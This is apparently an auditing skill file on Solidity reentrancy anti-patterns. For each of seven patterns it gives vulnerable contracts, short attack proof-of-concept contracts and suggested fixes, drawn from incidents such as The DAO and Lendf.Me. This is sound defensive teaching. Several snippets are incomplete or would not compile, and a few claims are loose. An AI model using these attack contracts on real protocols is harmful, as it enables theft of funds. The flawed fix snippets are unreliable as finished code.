---
id: REENTRANCY-ANTI-PATTERNS
title: Reentrancy Anti-Patterns (What NOT to Do)
category: anti-pattern
triggers:
  - reentrancy bad code
  - reentrancy mistakes
  - wrong reentrancy protection
related_skills:
  - patterns/reentrancy-patterns.md
  - attack-trees/lending-attack-tree.md
  - attack-trees/dex-attack-tree.md
---

# Reentrancy Anti-Patterns

Examples of **BAD** code patterns for reentrancy protection. These are real mistakes found in production.

---

## Anti-Pattern #1: State Update After External Call

> **Severity: Critical** | **Estimated Loss: $1M-$60M+** | **Fix Priority: Immediate**

### BAD CODE
```solidity
// ❌ VULNERABLE: Classic reentrancy
contract Bank {
    mapping(address => uint) public balances;
    
    function withdraw(uint amount) external {
        require(balances[msg.sender] >= amount);
        
        // External call BEFORE state update
        (bool success,) = msg.sender.call{value: amount}("");
        require(success);
        
        // State update AFTER external call
        balances[msg.sender] -= amount;
    }
}
```

### Why It's Bad
- **Reentrancy window**: Balance not updated until after external call
- **State inconsistent**: Attacker can withdraw multiple times
- **Checks-Effects-Interactions violated**: External call before state change

### Exploited In
- **The DAO** (2016, $60M) - Original reentrancy attack
- **Lendf.Me** (2020, $25M) - ERC777 reentrancy
- **Grim Finance** (2021, $30M) - Vault reentrancy

### Attack PoC
```solidity
contract Attack {
    Bank bank;
    uint attackAmount = 10 ether;
    
    constructor(address _bank) {
        bank = Bank(_bank);
    }
    
    function attack() external payable {
        bank.deposit{value: attackAmount}();
        bank.withdraw(attackAmount);
    }
    
    receive() external payable {
        // Called when bank.withdraw sends ETH
        if (address(bank).balance >= attackAmount) {
            // Balance not yet updated, can withdraw again
            bank.withdraw(attackAmount);
        }
    }
}
```

### Correct Pattern
```solidity
// ✅ GOOD: Checks-Effects-Interactions
function withdraw(uint amount) external {
    require(balances[msg.sender] >= amount); // Checks
    
    balances[msg.sender] -= amount; // Effects (state update FIRST)
    
    (bool success,) = msg.sender.call{value: amount}(""); // Interactions
    require(success);
}
```

---

## Anti-Pattern #2: Missing nonReentrant on Critical Functions

> **Severity: Critical** | **Estimated Loss: $1M-$30M** | **Fix Priority: Immediate**

### BAD CODE
```solidity
// ❌ VULNERABLE: No reentrancy guard
contract LendingPool {
    mapping(address => uint) public supplied;
    mapping(address => uint) public borrowed;
    
    // Missing nonReentrant!
    function withdraw(uint amount) external {
        supplied[msg.sender] -= amount;
        IERC20(token).transfer(msg.sender, amount);
    }
    
    // Missing nonReentrant!
    function borrow(uint amount) external {
        require(getCollateralValue(msg.sender) >= amount);
        borrowed[msg.sender] += amount;
        IERC20(token).transfer(msg.sender, amount);
    }
}
```

### Why It's Bad
- **Cross-function reentrancy**: Withdraw → reenter → borrow
- **Inconsistent state**: Functions see stale data
- **No global lock**: Each function executes independently

### Attack PoC
```solidity
contract Attack {
    LendingPool pool;
    
    receive() external payable {
        // Called during withdraw
        // supplied already decremented
        // But collateral check in borrow() sees old value
        
        if (canBorrowMore()) {
            pool.borrow(maxAmount);
        }
    }
    
    function attack() external {
        pool.withdraw(mySupply);
        // During withdraw, reenter to borrow
        // Borrow uses stale collateral value
    }
}
```

### Correct Pattern
```solidity
// ✅ GOOD: Global reentrancy guard
contract LendingPool is ReentrancyGuard {
    function withdraw(uint amount) external nonReentrant {
        supplied[msg.sender] -= amount;
        IERC20(token).transfer(msg.sender, amount);
    }
    
    function borrow(uint amount) external nonReentrant {
        require(getCollateralValue(msg.sender) >= amount);
        borrowed[msg.sender] += amount;
        IERC20(token).transfer(msg.sender, amount);
    }
}
```

---

## Anti-Pattern #3: Read-Only Reentrancy

> **Severity: High** | **Estimated Loss: $500K-$10M** | **Fix Priority: High**

### BAD CODE
```solidity
// ❌ VULNERABLE: View function during state transition
contract LPVault {
    IUniswapV2Pair public pair;
    
    function getSharePrice() public view returns (uint) {
        (uint reserve0, uint reserve1,) = pair.getReserves();
        uint totalSupply = pair.totalSupply();
        
        // Calculate LP token value
        return (reserve0 + reserve1) / totalSupply;
    }
    
    function withdraw(uint shares) external {
        uint value = shares * getSharePrice();
        
        // Transfer LP tokens to user
        pair.transfer(msg.sender, shares);
        
        // Pay user based on share price
        payable(msg.sender).transfer(value);
    }
}
```

### Why It's Bad
- **View not protected**: getSharePrice() callable during state transition
- **Other protocols depend**: External protocols use getSharePrice()
- **Stale data**: Returns inconsistent state

### Exploited In
- **Sentiment** (2023, $1M) - Read-only reentrancy via Balancer
- **CREAM** (2021) - Price oracle manipulation via reentrancy

### Attack PoC
```solidity
contract Attack {
    LPVault vault;
    ExternalProtocol external;
    
    receive() external payable {
        // Called during vault.withdraw()
        // LP tokens transferred but totalSupply not updated yet
        
        uint sharePrice = vault.getSharePrice();
        // Returns inflated price (stale totalSupply)
        
        // Other protocol uses this price
        external.depositCollateral(myLPTokens);
        // Valued at inflated price
        
        external.borrow(maxAmount);
        // Overborrow based on wrong price
    }
}
```

### Correct Pattern
```solidity
// ✅ GOOD: Reentrancy guard even on view-like functions
contract LPVault is ReentrancyGuard {
    function getSharePrice() public view returns (uint) {
        // Add reentrancy check in state-changing functions that might call this
        // Or use snapshot pattern
    }
    
    function withdraw(uint shares) external nonReentrant {
        // Calculate BEFORE state change
        uint value = shares * getSharePrice();
        
        // Update state
        totalShares -= shares;
        
        // Then external calls
        pair.transfer(msg.sender, shares);
        payable(msg.sender).transfer(value);
    }
}
```

---

## Anti-Pattern #4: ERC777 Callback Reentrancy

> **Severity: Critical** | **Estimated Loss: $5M-$25M+** | **Fix Priority: Immediate**

### BAD CODE
```solidity
// ❌ VULNERABLE: Accepting ERC777 without protection
contract Vault {
    mapping(address => uint) public deposits;
    
    function deposit(IERC20 token, uint amount) external {
        // ERC777 calls tokensReceived() during transfer
        token.transferFrom(msg.sender, address(this), amount);
        
        // State update AFTER transfer
        deposits[msg.sender] += amount;
    }
}
```

### Why It's Bad
- **ERC777 hook**: tokensReceived() called during transfer
- **Before state update**: Attacker controls flow before balance updated
- **Hidden callback**: Not obvious from code

### Exploited In
- **Uniswap** (2020, caught in audit) - ERC777 reentrancy
- **Lendf.Me** (2020, $25M) - imBTC ERC777 reentrancy

### Attack PoC
```solidity
// Attacker's ERC1820 receiver
function tokensReceived(
    address operator,
    address from,
    address to,
    uint256 amount,
    bytes calldata userData,
    bytes calldata operatorData
) external {
    // Called during vault.deposit()
    // Before deposits[msg.sender] updated
    
    if (canExploit) {
        vault.withdraw(previousDeposits);
        // Withdraw old balance before new deposit recorded
    }
}
```

### Correct Pattern
```solidity
// ✅ GOOD: Block ERC777 or add reentrancy guard
contract Vault is ReentrancyGuard {
    function deposit(IERC20 token, uint amount) external nonReentrant {
        // Update state FIRST
        deposits[msg.sender] += amount;
        
        // Then transfer
        token.transferFrom(msg.sender, address(this), amount);
        
        // Or better: block ERC777 tokens entirely
        require(!isERC777(token), "ERC777 not supported");
    }
}
```

---

## Anti-Pattern #5: Reentrancy via Callback Parameter

> **Severity: High** | **Estimated Loss: $1M-$20M** | **Fix Priority: High**

### BAD CODE
```solidity
// ❌ VULNERABLE: User-controlled callback
contract FlashLoan {
    function flashLoan(uint amount, address callback) external {
        IERC20(token).transfer(msg.sender, amount);
        
        // User controls callback address
        IFlashLoanReceiver(callback).onFlashLoan(amount);
        
        require(
            IERC20(token).balanceOf(address(this)) >= initialBalance,
            "Not repaid"
        );
    }
}
```

### Why It's Bad
- **Arbitrary call**: Attacker controls callback address
- **Before repayment check**: Can reenter before repaid check
- **State manipulation**: Can exploit other functions during callback

### Attack PoC
```solidity
contract Attack is IFlashLoanReceiver {
    function attack() external {
        // Request flash loan with this contract as callback
        flashLoan.flashLoan(1000 ether, address(this));
    }
    
    function onFlashLoan(uint amount) external {
        // During callback, before repayment check
        
        // Exploit: Use flash loaned funds in another protocol
        anotherProtocol.deposit(amount);
        anotherProtocol.manipulateSomething();
        anotherProtocol.withdraw();
        
        // Repay flash loan
        token.transfer(msg.sender, amount);
    }
}
```

### Correct Pattern
```solidity
// ✅ GOOD: Reentrancy guard + validation
contract FlashLoan is ReentrancyGuard {
    function flashLoan(uint amount) external nonReentrant {
        uint initialBalance = IERC20(token).balanceOf(address(this));
        
        IERC20(token).transfer(msg.sender, amount);
        
        // Callback to msg.sender only (not arbitrary address)
        IFlashLoanReceiver(msg.sender).onFlashLoan(amount);
        
        require(
            IERC20(token).balanceOf(address(this)) >= initialBalance + fee,
            "Not repaid"
        );
    }
}
```

---

## Anti-Pattern #6: Delegatecall Reentrancy

> **Severity: Critical** | **Estimated Loss: $5M-$50M** | **Fix Priority: High**

### BAD CODE
```solidity
// ❌ VULNERABLE: Delegatecall with reentrancy
contract Proxy {
    address public implementation;
    mapping(address => uint) public balances;
    
    fallback() external payable {
        // Delegatecall to implementation
        (bool success,) = implementation.delegatecall(msg.data);
        require(success);
    }
    
    function withdraw(uint amount) external {
        require(balances[msg.sender] >= amount);
        
        // External call
        (bool success,) = msg.sender.call{value: amount}("");
        require(success);
        
        // State update after
        balances[msg.sender] -= amount;
    }
}
```

### Why It's Bad
- **Complex state**: Delegatecall shares storage
- **Hidden reentrancy**: Implementation can reenter proxy
- **Storage collision**: Variables in wrong slots

### Attack PoC
```solidity
// Malicious implementation
contract MaliciousImpl {
    address public implementation; // Slot 0
    mapping(address => uint) public balances; // Slot 1
    
    function exploit() external {
        // Called via delegatecall
        // Shares proxy's storage
        
        // Modify proxy's storage directly
        implementation = address(this);
        balances[msg.sender] = type(uint).max;
    }
}
```

### Correct Pattern
```solidity
// ✅ GOOD: Reentrancy guard in proxy
contract Proxy is ReentrancyGuard {
    address public implementation;
    
    fallback() external payable nonReentrant {
        (bool success,) = implementation.delegatecall(msg.data);
        require(success);
    }
}

// And in implementation
contract Implementation is ReentrancyGuard {
    function withdraw(uint amount) external nonReentrant {
        require(balances[msg.sender] >= amount);
        balances[msg.sender] -= amount;
        (bool success,) = msg.sender.call{value: amount}("");
        require(success);
    }
}
```

---

## Anti-Pattern #7: Ignoring Token Transfer Return Value

> **Severity: Medium** | **Estimated Loss: $100K-$5M** | **Fix Priority: Medium**

### BAD CODE
```solidity
// ❌ VULNERABLE: Not checking return value
contract TokenVault {
    mapping(address => uint) public balances;
    
    function withdraw(uint amount) external {
        balances[msg.sender] -= amount;
        
        // IERC20(token).transfer doesn't revert on failure for some tokens
        IERC20(token).transfer(msg.sender, amount);
        // If transfer fails silently, user loses balance but gets no tokens
    }
}
```

### Why It's Bad
- **Silent failure**: Some tokens return false instead of reverting
- **State corrupted**: Balance decremented but transfer failed
- **Reentrancy possible**: Failed transfer allows retry

### Attack PoC
```solidity
// If token returns false on failure
function exploit() external {
    // 1. Withdraw but transfer fails (returns false)
    vault.withdraw(100 ether);
    // balance[attacker] -= 100
    // But transfer failed, vault still has tokens
    
    // 2. State is now inconsistent
    // 3. Can exploit accounting mismatch
}
```

### Correct Pattern
```solidity
// ✅ GOOD: Use SafeERC20
import "@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol";

contract TokenVault {
    using SafeERC20 for IERC20;
    
    function withdraw(uint amount) external {
        balances[msg.sender] -= amount;
        
        // SafeERC20 reverts on failure
        IERC20(token).safeTransfer(msg.sender, amount);
    }
}
```

---

## Quick Reference: Reentrancy Anti-Patterns

| Anti-Pattern | Severity | Attack Type | Fix |
|--------------|----------|-------------|-----|
| #1 State After External Call | Critical | Classic reentrancy | Checks-Effects-Interactions |
| #2 Missing nonReentrant | Critical | Cross-function reentrancy | Add ReentrancyGuard |
| #3 Read-Only Reentrancy | High | Oracle manipulation | Guard state transitions |
| #4 ERC777 Callbacks | Critical | Hidden reentrancy | Block ERC777 or guard |
| #5 Callback Parameter | High | Arbitrary reentrancy | Validate callback, guard |
| #6 Delegatecall Reentrancy | Critical | Storage manipulation | Guard proxy and impl |
| #7 Ignore Return Value | Medium | Silent failure | Use SafeERC20 |

---

## See Also

- **Correct Patterns:** [patterns/reentrancy-patterns.md](../patterns/reentrancy-patterns.md)
- **Attack Trees:** [attack-trees/lending-attack-tree.md](../attack-trees/lending-attack-tree.md)
- **Exploits:** exploit-forensics/dao-2016.md, exploit-forensics/lendf-2020.md
